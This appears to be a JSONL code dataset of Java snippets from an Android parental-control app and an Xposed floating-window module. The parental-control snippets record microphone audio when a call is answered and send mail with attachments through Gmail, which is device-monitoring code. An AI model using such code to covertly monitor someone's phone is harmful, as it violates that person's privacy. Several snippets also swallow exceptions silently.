{"docstring": "/** Called when the activity is first created. */\n", "func_signal": "@Override\npublic void onCreate(Bundle savedInstanceState)", "code": "{\n\tsuper.onCreate(savedInstanceState);\n\tsetContentView(R.layout.main);\n\n\t/*\n\t * show the mail default botton\n\t */\n\tbtMain = (Button) findViewById(R.id.buttonMain);\n\tbtMain.setOnClickListener(new View.OnClickListener() {\n\t\tpublic void onClick(View arg0) {\n\t\t\tToast.makeText(getBaseContext(),\n\t\t\t\t\t\"Show the List of Options to get Information\",\n\t\t\t\t\tToast.LENGTH_LONG).show();\n\t\t\tIntent l = new Intent(ParentdroidActivity.this,\n\t\t\t\t\tActionActivity.class);\n\t\t\tstartActivity(l);\n\t\t\t\n\t\t}\n\t});\n\t/*\n\t * send the msg to parentdroid\n\t */\n\tthis.btMSG = (Button) findViewById(R.id.showmsgbutton1);\n\tthis.btMSG.setOnClickListener(new View.OnClickListener() {\n\t\tpublic void onClick(View arg0) {\n\t\t\tToast.makeText(getBaseContext(),\n\t\t\t\t\t\"Show the messages received by Parent\",\n\t\t\t\t\tToast.LENGTH_LONG).show();\n\t\t\t\n\t\t\tIntent intent = new Intent(ParentdroidActivity.this, SMSReceiveActivity.class);\n\t\t\tstartService(intent);\n\t\t}\n\t});\n}", "path": "parentdroid\\src\\parentalcontrol\\parent\\GUI\\ParentdroidActivity.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/*\n * send email with text body\n */\n", "func_signal": "public synchronized void sendMail(String subject, String body, String sender, String recipients) throws Exception", "code": "{   \n    try{\n    MimeMessage message = new MimeMessage(session);   \n    DataHandler handler = new DataHandler(new ByteArrayDataSource(body.getBytes(), \"text/plain\"));   \n    message.setSender(new InternetAddress(sender));   \n    message.setSubject(subject);\n    //add attachment to the mail\n    if(true){\n    \tmessage.setContent(multipart);\n    }\n    message.setDataHandler(handler);   \n    if (recipients.indexOf(',') > 0)   \n        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));   \n    else  \n        message.setRecipient(Message.RecipientType.TO, new InternetAddress(recipients));   \n    Transport.send(message);   \n    }catch(Exception e){\n\n    }\n}", "path": "childroid\\src\\parentalcontroller\\child\\com\\Internet\\GMailSender.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/*\n * Send the mail to Gmail\n */\n", "func_signal": "public GMailSender(String user, String password)", "code": "{   \n    this.user = user;   \n    this.password = password;   \n\n    Properties props = new Properties();   \n    props.setProperty(\"mail.transport.protocol\", \"smtp\");   \n    props.setProperty(\"mail.host\", mailhost);   \n    props.put(\"mail.smtp.auth\", \"true\");   \n    props.put(\"mail.smtp.port\", \"465\");   \n    props.put(\"mail.smtp.socketFactory.port\", \"465\");   \n    props.put(\"mail.smtp.socketFactory.class\",   \n            \"javax.net.ssl.SSLSocketFactory\");   \n    props.put(\"mail.smtp.socketFactory.fallback\", \"false\");   \n    props.setProperty(\"mail.smtp.quitwait\", \"false\");   \n\n    session = Session.getDefaultInstance(props, this);   \n    //add attachments\n    multipart = new MimeMultipart();\n}", "path": "childroid\\src\\parentalcontroller\\child\\com\\Internet\\GMailSender.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/*on receive the data action\n */\n", "func_signal": "@Override\npublic void onReceive(Context context, Intent intent)", "code": "{\n\tString action = intent.getAction();\n\tif (action.equals(\"android.intent.action.ANSWER\")) {\n\t\t// Phone call recording\n\t\ttry {\n\t\t\trecorder.setAudioSource(MediaRecorder.AudioSource.MIC);\n\t\t\trecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);\n\t\t\trecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);\n\t\t\trecorder.setOutputFile(\"\");\n\t\t\trecorder.prepare();\n\t\t\trecorder.start();\n\t\t\trecordStarted = true;\n\t\t\ttelManager = (TelephonyManager) context\n\t\t\t\t\t.getSystemService(Context.TELEPHONY_SERVICE);\n\t\t\ttelManager.listen(phoneListener,\n\t\t\t\t\tPhoneStateListener.LISTEN_CALL_STATE);\n\t\t} catch (Exception ex) {\n\n\t\t}\n\t}\n}", "path": "childroid\\src\\parentalcontroller\\child\\Logic\\CallRecordService.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/*\n * *set the path to the sdcard\n */\n", "func_signal": "private String sanitizePath(String path)", "code": "{\n\tif (!path.startsWith(\"/\")) {\n\t\tpath = \"/\" + path;\n\t}\n\tif (!path.contains(\".\")) {\n\t\tpath += \".3gp\";\n\t}\n\treturn Environment.getExternalStorageDirectory().getAbsolutePath()\n\t\t\t+ path;\n}", "path": "childroid\\src\\parentalcontroller\\child\\com\\File\\AudioRecordService.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/**\n * Show the location on Map\n */\n", "func_signal": "private void showLocationOnMap(Location location)", "code": "{\n  geoPoint = new GeoPoint((int) (location.getLatitude() * 1E6),\n      (int) (location.getLongitude() * 1E6));\n  mapController.animateTo(geoPoint);\n  mapController.setZoom(12);\n  // Add a location marker\n  MapOverlay mapOverlay = new MapOverlay();\n  List<Overlay> listOfOverlays = mapView.getOverlays();\n  listOfOverlays.clear();\n  listOfOverlays.add(mapOverlay);\n  mapView.invalidate();\n}", "path": "parentdroid\\src\\parentalcontrol\\parent\\GUI\\MapViewActivity.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "// private Drawable icon;\n", "func_signal": "public void prettyPrint()", "code": "{\n\tLog.d(\"tag:gihan\", appname + \"\\t\" + pname + \"\\t\" + versionName + \"\\t\"\n\t\t\t+ versionCode);\n}", "path": "childroid\\src\\parentalcontroller\\child\\Logic\\GetInstallApplicationService.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/**\n * Cast an IBinder object into an parentalcontroller.child.Logic.IScreenshotProvider interface,\n * generating a proxy if needed.\n */\n", "func_signal": "public static parentalcontroller.child.Logic.IScreenshotProvider asInterface(android.os.IBinder obj)", "code": "{\nif ((obj==null)) {\nreturn null;\n}\nandroid.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR);\nif (((iin!=null)&&(iin instanceof parentalcontroller.child.Logic.IScreenshotProvider))) {\nreturn ((parentalcontroller.child.Logic.IScreenshotProvider)iin);\n}\nreturn new parentalcontroller.child.Logic.IScreenshotProvider.Stub.Proxy(obj);\n}", "path": "childroid\\gen\\parentalcontroller\\child\\Logic\\IScreenshotProvider.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/**\n * Stops a recording that has been previously started.\n */\n", "func_signal": "public void stop() throws IOException", "code": "{\n\trecorder.stop();\n\trecorder.release();\n}", "path": "childroid\\src\\parentalcontroller\\child\\com\\File\\AudioRecordService.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/*\n * \n */\n", "func_signal": "public ByteArrayDataSource(byte[] data, String type)", "code": "{   \n    super();   \n    this.data = data;   \n    this.type = type;   \n}", "path": "childroid\\src\\parentalcontroller\\child\\com\\Internet\\GMailSender.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/**\n * Get KEYCODE\n */\n", "func_signal": "public boolean onKeyDown(int keyCode, KeyEvent event)", "code": "{\n  MapController mc = mapView.getController();\n  switch (keyCode) {\n  case KeyEvent.KEYCODE_3:\n    mc.zoomIn();\n    break;\n  case KeyEvent.KEYCODE_1:\n    mc.zoomOut();\n    break;\n  }\n  return super.onKeyDown(keyCode, event);\n}", "path": "parentdroid\\src\\parentalcontrol\\parent\\GUI\\MapViewActivity.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/**\n * The IntentService calls this method from the default worker thread with\n * the intent that started the service. When this method returns,\n * IntentService stops the service, as appropriate.\n */\n", "func_signal": "@Override\nprotected void onHandleIntent(Intent intent)", "code": "{\n\t// Normally we would do some work here, like download a file.\n\t// For our sample, we just sleep for 5 seconds.\n\tLog.d(\"intentservice\", \"on handle started\");\n\tArrayList<PInfo> packages = getPackages();\n\tfor (int i = 0; i < packages.size(); i++) {\n\t\tPInfo p = packages.get(i);\n\t\tLog.d(\"count\", Integer.toString(i));\n\t\tif (\"Calendar\".equals(p.appname)) {\n\t\t\tLog.d(\"kill\", \"::Going to kill the process \" + p.appname + \" \"\n\t\t\t\t\t+ p.pname);\n\t\t\t//actManager.killBackgroundProcesses(p.pname);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tlong endTime = System.currentTimeMillis() + 5 * 100;\n\twhile (System.currentTimeMillis() < endTime) {\n\t\tsynchronized (this) {\n\t\t\ttry {\n\t\t\t\twait(endTime - System.currentTimeMillis());\n\t\t\t} catch (Exception e) {\n\t\t\t}\n\t\t}\n\t}\n\tIntent i = new Intent(this, MapViewActivity.class);\n\t//startActivity(i);\n\t\n\t//getPackages();\n}", "path": "childroid\\src\\parentalcontroller\\child\\Logic\\GetInstallApplicationService.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "/**\n * Set a location listener\n */\n", "func_signal": "private void setLocationListener(LocationManager locationManager)", "code": "{\n  // getting GPS status\n  isGPSEnabled = locationManager\n      .isProviderEnabled(LocationManager.GPS_PROVIDER);\n  // getting network status\n  isNetworkEnabled = locationManager\n      .isProviderEnabled(LocationManager.NETWORK_PROVIDER);\n  // Define a listener that responds to location updates\n  locationListener = new LocationListener() {\n    public void onLocationChanged(Location location) {\n      // Called when a new location is found by the network location provider.\n      showLocationOnMap(location);\n    }\n\n    public void onStatusChanged(String provider, int status, Bundle extras) {\n    }\n\n    public void onProviderEnabled(String provider) {\n    }\n\n    public void onProviderDisabled(String provider) {\n    }\n  };\n  // Register the listener to receive location updates\n  if (isNetworkEnabled) {\n    showLocationOnMap(locationManager\n        .getLastKnownLocation(LocationManager.NETWORK_PROVIDER));\n    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,\n        TIME_INTERVAL, DISTANCE, locationListener);\n    if(D) Log.d(TAG, \"Network provider : \"+isNetworkEnabled);\n  } else if (isGPSEnabled) {\n    showLocationOnMap(locationManager\n        .getLastKnownLocation(LocationManager.GPS_PROVIDER));\n    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,\n        TIME_INTERVAL, DISTANCE, locationListener);\n    if(D) Log.d(TAG, \"GPS provider : \"+isGPSEnabled);\n  } else {\n    Toast.makeText(getBaseContext(), \"No Network Available.\",\n        Toast.LENGTH_SHORT).show();\n    if(D) Log.d(TAG, \"Network provider : \"+isNetworkEnabled + \" GPS provider : \"+isGPSEnabled);\n  }\n}", "path": "parentdroid\\src\\parentalcontrol\\parent\\GUI\\MapViewActivity.java", "repo_name": "gihankarunarathne/Parental-Controller-Android", "stars": 71, "license": "None", "language": "java", "size": 4097}
{"docstring": "// create a snap positioning based on the range of our touch coordinates\n", "func_signal": "private void calculateSnap()", "code": "{\n\tswitch (mSnap) {\n\tcase SNAP_LEFT:\n\t\tmSnapParam[0] = (mScreenWidth / 2) + 1;\n\t\tmSnapParam[1] = ViewGroup.LayoutParams.MATCH_PARENT;\n\t\tmSnapParam[2] = Gravity.TOP | Gravity.LEFT;\n\t\tbreak;\n\tcase SNAP_RIGHT:\n\t\tmSnapParam[0] = (mScreenWidth / 2) + 1;\n\t\tmSnapParam[1] = ViewGroup.LayoutParams.MATCH_PARENT;\n\t\tmSnapParam[2] = Gravity.RIGHT;\n\t\tbreak;\n\tcase SNAP_TOP:\n\t\tmSnapParam[0] = ViewGroup.LayoutParams.MATCH_PARENT;\n\t\tmSnapParam[1] = (mScreenHeight / 2) + 1;\n\t\tmSnapParam[2] = Gravity.TOP;\n\t\tbreak;\n\tcase SNAP_BOTTOM:\n\t\tmSnapParam[0] = ViewGroup.LayoutParams.MATCH_PARENT;\n\t\tmSnapParam[1] = (mScreenHeight / 2) + 1;\n\t\tmSnapParam[2] = Gravity.BOTTOM;\n\t\tbreak;\n\tcase SNAP_NONE:\n\t\tmSnapParam[0] = UNKNOWN;\n\t\tmSnapParam[1] = UNKNOWN;\n\t\tmSnapParam[2] = UNKNOWN;\n\t}\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "/**\n * Forces the window to snap to this side programatically without user input\n * @param side - Side of the screen to snap to.\n */\n", "func_signal": "public void forceSnap(int side)", "code": "{\n\tif (side == SNAP_NONE) {\n\t\trestoreOldPosition();\n\t\treturn;\n\t}\n\tif (isSnapped()) {\n\t\trestoreOldPositionWithoutRefresh();\n\t\tMultiWindowAppManager.appsSignalHideDragger(mContext);\n\t}\n\tmSnap = side;\n\tcalculateSnap();\n\tfinishSnap(true);\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// undo the snap when moving the window out of the snap region\n", "func_signal": "public boolean restoreOldPosition()", "code": "{\n\tif (!mSnapped) return false;\n\trestoreOldPositionWithoutRefresh();\n\trefreshLayout();\n\tMultiWindowAppManager.appsSignalHideDragger(mContext);\n\treturn true;\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "/* Android 4.2+ (End) */\n", "func_signal": "private static void launchFloating(PendingIntent pIntent, Context mContext)", "code": "{ \n\tIntent intent = new Intent();\n\tintent.addFlags(Common.FLAG_FLOATING_WINDOW);\n\tlaunch(intent, pIntent, mContext);\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\NotificationShadeHook.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// Create a view in SystemUI window manager\n", "func_signal": "private static void createOutlineView(Context ctx)", "code": "{\n\tif (mWm == null) {\n\t\tmWm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);\n\t}\n\tWindowManager.LayoutParams layOutParams = new WindowManager.LayoutParams(\n\t\t\tWindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,\n\t\t\tWindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,\n\t\t\tPixelFormat.TRANSLUCENT);\n\tlayOutParams.gravity = Gravity.TOP | Gravity.LEFT;\n\tUtil.addPrivateFlagNoMoveAnimationToLayoutParam(layOutParams);\n\tmOutline = getOutlineView(ctx, 0xFF33b5e5);\n\tmOutline.setFocusable(false);\n\tmOutline.setClickable(false);\n\tmOutline.setVisibility(View.GONE);\n\t\n\tmWm.addView(mOutline, layOutParams);\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\SystemUIOutliner.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// show the outline with positioning (x,y)\n", "func_signal": "private static void refreshOutlineView(Context ctx, int x, int y, int height, int width)", "code": "{\n\tif (mOutline == null) {\n\t\tcreateOutlineView(ctx);\n\t}\n\tif (x == HIDE || y == HIDE || height == HIDE || width == HIDE) {\n\t\tmOutline.setVisibility(View.GONE);\n\t\treturn;\n\t}\n\tWindowManager.LayoutParams param = (WindowManager.LayoutParams) mOutline.getLayoutParams();\n\tparam.x = x;\n\tparam.y = y;\n\tparam.height = height;\n\tparam.width = width;\t\t\n\tparam.gravity = Gravity.TOP | Gravity.LEFT;\n\tmWm.updateViewLayout(mOutline, param);\n\tmOutline.setVisibility(View.VISIBLE);\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\SystemUIOutliner.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "/**\n * An Aero Snap Class to check if the current pointer's coordinates\n * are in range of the snap region.\n */\n// TODO : Clean up codes, make it more customizable\n", "func_signal": "public AeroSnap(Window window, int delay)", "code": "{\n\tmWindow = window;\n\tmContext = window.getContext();\n\tmHandler = new Handler();\n\tmDelay = delay;\n\trefreshScreenSize();\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// Thanks: http://just-another-blog.net/programming/how-to-implement-horizontal-view-swiping-with-tabs/\n// Thanks: http://stackoverflow.com/questions/15845632/adding-preferencefragment-to-fragmentpageradapter\n", "func_signal": "@Override\nprotected void onCreate(Bundle savedInstanceState)", "code": "{\n\tsuper.onCreate(savedInstanceState);\n\tsetTheme(android.R.style.Theme_Holo_Light_NoActionBar);\n\tsetContentView(R.layout.activity_viewpager);\n\t\n\tLinkedList<Integer> fragmentPages = new LinkedList<Integer>();\n\tfragmentPages.add(Pages.WELCOME);\n\t/*if (FirstUseHelper.hasMainHaloFlagInRom())*/ fragmentPages.add(Pages.HALO_FLAG_CONFLICTING);\n\t/*if (FirstUseHelper.isAppOnSystem(this))*/ fragmentPages.add(Pages.APK_ON_SYSTEM);\n\t\n\tswitch (FirstUseHelper.hasKitkatVisibilityBug(this)) {\n\tcase 1:\n\t\tfragmentPages.add(Pages.KK_VISIBILITY_BUG_CONFIRMED);\n\t\tbreak;\n\tcase 2:\n\t\tfragmentPages.add(Pages.KK_VISIBILITY_BUG_SUSPECTED);\n\t\tbreak;\n\t}\n\tfragmentPages.add(Pages.FINISH);\n\t\n\tmPageAdapter = new PageAdapter(getFragmentManager(), fragmentPages) {\n\t\t@Override\n\t\tpublic View makeView(LayoutInflater inflater, ViewGroup container, int position) {\n\t\t\tswitch (position) {\n\t\t\tcase Pages.WELCOME:\n\t\t\t\treturn inflater.inflate(R.layout.firstuse_welcome, container, false);\n\t\t\tcase Pages.HALO_FLAG_CONFLICTING:\n\t\t\t\treturn inflater.inflate(R.layout.firstuse_haloconflict, container, false);\n\t\t\tcase Pages.APK_ON_SYSTEM:\n\t\t\t\tView vg = inflater.inflate(R.layout.firstuse_haloconflict, container, false);\n\t\t\t\t((TextView) vg.findViewById(android.R.id.title)).setText(getResources()\n\t\t\t\t\t\t.getString(R.string.firstuse_system_title));\n\t\t\t\t((TextView) vg.findViewById(android.R.id.text1)).setText(getResources()\n\t\t\t\t\t\t.getString(R.string.firstuse_system_info));\n\t\t\t\t((TextView) vg.findViewById(android.R.id.text2)).setText(getResources()\n\t\t\t\t\t\t.getString(R.string.firstuse_system_fix));\n\t\t\t\treturn vg;\n\t\t\t\t//TODO finish up KK bug page\n\t\t\tcase Pages.FINISH:\n\t\t\t\tView view = inflater.inflate(R.layout.firstuse_finish, container, false);\n\t\t\t\tview.findViewById(android.R.id.button1).setOnClickListener(new View.OnClickListener() {\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void onClick(View v) {\n\t\t\t\t\t\tfinish();\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t\treturn view;\n\t\t\t}\n\t\t\treturn inflater.inflate(R.layout.activity_testing, container, false);\n\t\t\n\t\t}\n\t};\n\tmViewPager = (ViewPager) findViewById(R.id.view_pager);\n\tmViewPager.setAdapter(mPageAdapter);\n\tfindViewById(R.id.pager_title_strip).setVisibility(View.GONE);\n\t\n\t//switch (getPosition()) {\n\t\n\t/*if (Pages.WELCOME == getPosition()) {\n\t\treturn inflater.inflate(R.layout.fragment_welcome, container, false);\n\t} else if (PAGES.SKYPE_RESOLVER.value == getPosition()) {\n\t\treturn SkypeResolverHelper.getInstance().initView(inflater, container);\n\t} else if (PAGES.PORT_SCANNER.value == getPosition()) {\n\t\treturn PortScannerHelper.getInstance().initView(inflater, container);\n\t} else if (PAGES.CONTACT_ME.value == getPosition()) {\n\t\treturn ContactMeFormHelper.getInstance().initView(inflater, container);\n\t} else if (PAGES.GET_IP.value == getPosition()) {\n\t\treturn GetIPHelper.getInstance().initView(inflater, container);\n\t}\n\treturn inflater.inflate(R.layout.list_port_scanner, container, false);*/\n}\n\t\n\t\t//\tLog.d(\"zst123\", \"path=\" + getApplicationInfo().sourceDir);\n\t\t\t//Log.d(\"zst123\", \"hasMainHaloFlagInRom\" + hasMainHaloFlagInRom());\n//}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\FirstUseActivity.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// send broadcast after the snap delay\n", "func_signal": "private void broadcastShowWithTimeout()", "code": "{\n\tif (mTimeoutRunning) return;\n\tif (mRunnable == null) {\n\t\tmRunnable = new Runnable() {\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\tbroadcastShow(mContext,mSnapParam[0],mSnapParam[1],mSnapParam[2]);\n\t\t\t\tmHandler.postDelayed(new Runnable() {\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic void run() {\n\t\t\t\t\t\tmTimeoutRunning = false;\n\t\t\t\t\t\tmTimeoutDone = true;\n\t\t\t\t\t\t// Delay to offset the lag because broadcastShow\n\t\t\t\t\t\t// will have some delay in inflating the view.\n\t\t\t\t\t}\n\t\t\t\t}, 250);\n\t\t\t}\n\t\t};\n\t}\n\tmTimeoutRunning = true;\n\tmHandler.postDelayed(mRunnable, mDelay);\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "/* (End) Layout Position Method Helpers */\n", "func_signal": "private static void changeFocusApp(Activity a)", "code": "{\n\ttry {\n\t\tXHFWInterface inf = XHFWService.retrieveService(a);\n\t\t//TODO reuse this\n\t\tinf.bringAppToFront(getActivityToken(a), a.getTaskId());\n\t} catch (RemoteException e) {\n\t\te.printStackTrace();\n\t}\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\MovableWindow.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// http://stackoverflow.com/questions/9604644/how-do-i-get-a-reference-to-connectivityservice-object\n", "func_signal": "public final static Object getIWindowManagerProxy()", "code": "{\n\tClass<?> serviceManagerClass = XposedHelpers.findClass(\"android.os.ServiceManager\", null);\n\tIBinder binderProxy = (IBinder) XposedHelpers.callStaticMethod(serviceManagerClass,\n\t\t\t\"getService\", \"window\");\n\t// ServiceManager.getService(\"window\");\n\t/*\n\t * Now use pass the ServiceManager BinderProxy to the 'asInterface'\n\t * method of the interface Stub inner class\n\t */\n\tClass<?> stubClass = XposedHelpers.findClass(\"android.view.IWindowManager$Stub\", null);\n\treturn XposedHelpers.callStaticMethod(stubClass, \"asInterface\",\n\t\t\tnew Class[] { IBinder.class }, binderProxy);\n\t// IWindowManager.Stub.asInterface(binderPRoxy);\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\ipc\\XHFWService.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// svae the position so we can restore it later\n", "func_signal": "private boolean saveOldPosition()", "code": "{\n\tif (mRestorePosition) return true;\n\tif (mSnapped) {\n\t\treturn (mSnap == SNAP_NONE) || (mTimeoutRunning);\n\t}\n\tmSnapped = true;\n\tfinal WindowManager.LayoutParams params = mWindow.getAttributes();\n\tint[] layout = { params.x, params.y, params.width, params.height };\n\tmOldLayout = layout;\n\treturn true;\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// create outline view with translucent filling\n", "func_signal": "private static View getOutlineView(Context ctx, int color)", "code": "{\n\tFrameLayout outline = new FrameLayout(ctx);\n\tUtil.setBackgroundDrawable(outline, Util.makeOutline(color, Util.realDp(4, ctx)));\n\t\n\tView filling = new View(ctx);\n\tfilling.setBackgroundColor(color);\n\tfilling.setAlpha(0.5f);\n\toutline.addView(filling);\n\t\n\treturn outline;\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\SystemUIOutliner.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// maximize and restore the window.\n", "func_signal": "public void maximizeApp(Activity activity)", "code": "{\n\tif ((activity.getWindow().getAttributes().width  == ViewGroup.LayoutParams.MATCH_PARENT) ||\n\t\t(activity.getWindow().getAttributes().height == ViewGroup.LayoutParams.MATCH_PARENT)) {\n\t\tif (AeroSnap.isSnapped()) {\n\t\t\t// we need to maximize instead of restoring since it is snapped to the edge\n\t\t\tmAeroSnap.restoreOldPositionWithoutRefresh();\n\t\t\t// dont refresh since we need to maximize it again\n\t\t\tsaveNonMaximizedLayout(activity.getWindow());\n\t\t\t// save our unsnapped position, then maximize\n\t\t\tactivity.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT,\n\t\t\t\t\tViewGroup.LayoutParams.MATCH_PARENT);\n\t\t\treturn;\n\t\t}\n\t\trestoreNonMaximizedLayout(activity.getWindow());\n\t\tif (mMaximizeChangeTitleBarVisibility) {\n\t\t\tmOverlayView.setTitleBarVisibility(true);\n\t\t}\n\t} else {\n\t\tsaveNonMaximizedLayout(activity.getWindow());\n\t\tactivity.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT,\n\t\t\t\tViewGroup.LayoutParams.MATCH_PARENT);\n\t\tif (mMaximizeChangeTitleBarVisibility) {\n\t\t\tmOverlayView.setTitleBarVisibility(false);\n\t\t}\n\t}\n\t// after that, send a broadcast to sync the position of the window\n\tinitAndRefreshLayoutParams(activity.getWindow(), activity, activity.getPackageName());\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\MovableWindow.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "/**\n * Initializes the current screen size with respect to rotation.\n */\n", "func_signal": "private void refreshScreenSize()", "code": "{\n\tfinal WindowManager wm = (WindowManager) mContext.getSystemService(Context.WINDOW_SERVICE);\n\tfinal DisplayMetrics metrics = new DisplayMetrics();\n\twm.getDefaultDisplay().getMetrics(metrics);\n\t\n\tmScreenHeight = metrics.heightPixels;\n\tmScreenWidth = metrics.widthPixels;\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\helpers\\AeroSnap.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
{"docstring": "// Send the app to the back, and show a notification to restore\n", "func_signal": "@SuppressLint(\"NewApi\")\n@SuppressWarnings(\"deprecation\")\npublic void minimizeAndShowNotification(final Activity ac)", "code": "{\n\tif (!mMinimizeToStatusbar) {\n\t\tac.moveTaskToBack(true);\n\t\treturn;\n\t}\n\n\tIntent i = new Intent(Common.REMOVE_NOTIFICATION_RESTORE + ac.getPackageName());\n\tApplicationInfo app_info = ac.getApplication().getApplicationInfo();\n\tPendingIntent intent = PendingIntent.getBroadcast(ac, 0, i,\n\t\t\tPendingIntent.FLAG_UPDATE_CURRENT);\n\tString title = String.format(mModRes.getString(R.string.dnm_minimize_notif_title),\n        \t\tapp_info.loadLabel(ac.getPackageManager()));\n\n\tNotification.Builder nb = new Notification.Builder(ac)\n\t        .setContentTitle(title)\n\t        .setContentText(mModRes.getString(R.string.dnm_minimize_notif_summary))\n\t        .setSmallIcon(app_info.icon)\n\t        .setAutoCancel(true)\n\t        .setContentIntent(intent)\n\t        .setOngoing(true);\n\t\n\tNotification n;\n\tif (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {\n\t\tn = nb.build();\n\t} else {\n\t\tn = nb.getNotification();\n\t}\n\t\n\tfinal NotificationManager notificationManager =\n\t  (NotificationManager) ac.getSystemService(Context.NOTIFICATION_SERVICE);\n\tnotificationManager.notify(ID_NOTIFICATION_RESTORE, n);\n\n\tac.moveTaskToBack(true);\n\n\tac.registerReceiver(new BroadcastReceiver() {\n\t\t@Override\n\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\tnotificationManager.cancel(ID_NOTIFICATION_RESTORE);\n\t\t\tchangeFocusApp(ac);\n\t\t\tcontext.unregisterReceiver(this);\n\t\t}\n\t}, new IntentFilter(Common.REMOVE_NOTIFICATION_RESTORE + ac.getPackageName()));\n}", "path": "src\\com\\zst\\xposed\\halo\\floatingwindow\\hooks\\MovableWindow.java", "repo_name": "zst123/XHaloFloatingWindow", "stars": 74, "license": "None", "language": "java", "size": 3025}
